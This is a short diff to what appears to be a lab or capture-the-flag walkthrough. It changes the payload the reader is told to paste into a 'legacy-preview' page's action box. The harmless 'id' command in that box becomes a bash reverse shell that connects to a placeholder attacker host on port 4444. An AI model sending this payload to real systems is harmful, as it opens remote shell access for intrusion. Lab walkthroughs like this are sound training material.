@@ -90,7 +90,7 @@ http://<vm_ip>/legacy-preview
 In the `Action payload` box, paste this exact value:
 
 ```json
-{"mode":"preview","cmd":"bash -c 'id'"}
+bash -c "bash -i >& /dev/tcp/<LHOST>/4444 0>&1"
 ```
 
 Then click `Send preview payload`.
